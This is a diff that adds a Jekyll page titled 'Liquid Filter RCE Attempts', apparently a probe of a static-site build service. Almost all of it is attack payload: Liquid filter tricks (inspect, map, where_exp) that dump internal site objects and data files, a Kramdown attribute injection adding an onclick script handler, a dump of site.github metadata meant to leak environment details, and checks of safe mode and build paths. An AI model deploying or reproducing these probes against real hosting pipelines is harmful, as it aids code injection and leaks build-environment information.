@@ -1,0 +1,34 @@
+---
+layout: null
+---
+<html><body><pre>
+=== Liquid Filter RCE Attempts ===
+
+Test 1 - inspect on site object:
+{{ site | inspect | truncate: 5000 }}
+
+Test 2 - map filter abuse:
+{{ site.pages | map: "__id__" }}
+
+Test 3 - where filter type confusion:
+{{ site.pages | where_exp: "p", "p" }}
+
+Test 4 - Kramdown IAL code execution:
+{::options parse_block_html="true" /}
+<div markdown="1">
+{: onclick="alert(1)" }
+test
+</div>
+
+Test 5 - Data file contents:
+{{ site.data.rce | inspect }}
+
+=== Environment Leak via github metadata ===
+{{ site.github | inspect | truncate: 10000 }}
+
+=== Safe mode check ===
+safe: {{ site.safe }}
+env: {{ site.environment }}
+source: {{ site.source }}
+dest: {{ site.destination }}
+</pre></body></html>
